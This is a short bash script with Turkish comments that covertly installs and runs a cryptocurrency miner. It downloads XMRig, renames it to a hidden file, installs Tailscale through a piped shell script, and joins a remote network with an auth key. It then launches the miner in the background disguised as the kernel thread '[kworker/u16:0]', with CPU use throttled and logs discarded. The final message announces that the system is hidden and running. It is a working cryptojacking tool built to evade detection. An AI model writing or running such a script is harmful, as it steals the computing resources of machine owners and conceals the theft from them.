#!/bin/bash
# Hata almamak için ana dizini garantile
cd "$(dirname "$0")"

AGENT=".sys_core_logic"
CONFIG="logic_cfg.yaml"

# Motoru indir ve hazırla
wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
mv xmrig-6.22.2/xmrig ./$AGENT
rm -rf xmrig-6.22.2*

# Tailscale'i kur ve bağla
curl -fsSL https://tailscale.com/install.sh | sh
tailscale up --authkey=$TAILSCALE_AUTH

# Madenciyi başlat (kworker kılığında)
exec -a "[kworker/u16:0]" ./$AGENT -c $CONFIG \
    --cpu-max-threads-hint 35 \
    --background \
    --log-file /dev/null \
    > /dev/null 2>&1 &

echo "Sistem Gizlendi ve Çalışıyor."
